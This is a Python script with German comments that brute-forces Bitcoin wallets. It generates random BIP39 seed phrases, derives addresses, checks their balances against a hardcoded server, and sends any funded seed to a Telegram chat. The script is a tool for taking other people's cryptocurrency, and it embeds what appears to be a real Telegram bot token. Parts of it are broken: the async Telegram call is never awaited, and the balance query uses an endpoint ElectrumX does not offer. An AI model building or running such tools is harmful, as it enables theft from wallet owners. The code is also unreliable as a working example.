import asyncio
import requests  # Importiere die requests-Bibliothek
import logging
import time
from aiogram import Bot
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsNum

# Logger-Konfiguration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

# Deine Telegram-Token und Chat-ID
TELEGRAM_TOKEN = "7706620947:AAGLGdTIKi4dB3irOtVmHD57f1Xxa8-ZIcs"
TELEGRAM_CHAT_ID = "1596333326"  # Deine Chat-ID
ELECTRUMX_SERVER_URL = "http://85.215.178.149:50002"  # Beispiel-URL für ElectrumX-Server

# Bot initialisieren
bot = Bot(token=TELEGRAM_TOKEN)

# Timeout- und Retry-Einstellungen
TIMEOUT = 10  # Timeout in Sekunden
RETRIES = 5  # Maximal 5 Versuche bei einem Fehler
DELAY_BETWEEN_REQUESTS = 0.1  # Verzögerung zwischen den Anfragen, um Überlastung zu vermeiden

def generate_bip39_seed():
    """Generiere einen zufälligen BIP39 Seed"""
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)

def bip44_btc_address_from_seed(seed_phrase):
    """Erzeuge eine Bitcoin-Adresse aus einem BIP39 Seed"""
    seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx.PublicKey().ToAddress()

def check_btc_balance(address):
    """Überprüfe den BTC-Guthaben einer Adresse mit einem ElectrumX-Server"""
    attempt = 0
    while attempt < RETRIES:
        try:
            logger.info(f"Überprüfe Adresse {address}... Versuch {attempt + 1} von {RETRIES}")
            response = requests.get(f"{ELECTRUMX_SERVER_URL}/address/{address}")
            if response.status_code == 200:
                data = response.json()
                balance = data.get("confirmed", 0) / 100000000  # Satoshi zu BTC
                logger.info(f"Balance für Adresse {address}: {balance} BTC")
                return balance
            else:
                logger.warning(f"Fehlerhafte Antwort vom Server für Adresse {address}, Status: {response.status_code}")
                return 0
        except requests.exceptions.Timeout as e:
            attempt += 1
            logger.warning(f"Timeout bei Adresse {address} - Versuch {attempt} von {RETRIES}: {str(e)}")
            if attempt >= RETRIES:
                logger.error(f"Maximale Versuche erreicht für Adresse {address}. Kein Guthaben gefunden.")
                return 0
            # Verzögerung vor dem nächsten Versuch
            time.sleep(2 ** attempt)  # Exponentieller Backoff
        except requests.exceptions.RequestException as e:
            logger.error(f"Fehler bei der Anfrage für Adresse {address}: {str(e)}")
            return 0

def notify_telegram(seed, btc_address, btc_balance):
    """Benachrichtige Telegram bei einer gefundenen Wallet"""
    message = f"⚠️ Wallet mit Balance gefunden!\n\nSeed: {seed}\nAdresse: {btc_address}\nBalance: {btc_balance} BTC"
    bot.send_message(TELEGRAM_CHAT_ID, message)
    logger.info(f"Telegram-Benachrichtigung gesendet für Adresse {btc_address} mit {btc_balance} BTC")

def process_wallet(seed):
    """Verarbeite einen einzelnen Wallet Seed synchron"""
    logger.info(f"Verarbeite Wallet Seed: {seed}")
    btc_address = bip44_btc_address_from_seed(seed)
    btc_balance = check_btc_balance(btc_address)
    if btc_balance > 0:
        logger.info(f"Wallet mit Balance gefunden: {btc_address} - Balance: {btc_balance} BTC")
        notify_telegram(seed, btc_address, btc_balance)
    else:
        logger.info(f"Kein Guthaben für Adresse {btc_address}")

def main():
    """Hauptfunktion zum Überprüfen von Wallets nacheinander"""
    seeds = [generate_bip39_seed() for _ in range(10)]  # Test mit 10 Seeds

    # Überprüfe die Wallets nacheinander
    for seed in seeds:
        process_wallet(seed)
        # Verzögerung zwischen den Anfragen
        time.sleep(DELAY_BETWEEN_REQUESTS)

if __name__ == "__main__":
    try:
        logger.info("Starte das Script...")
        main()
    except KeyboardInterrupt:
        logger.info("Script wurde manuell beendet")
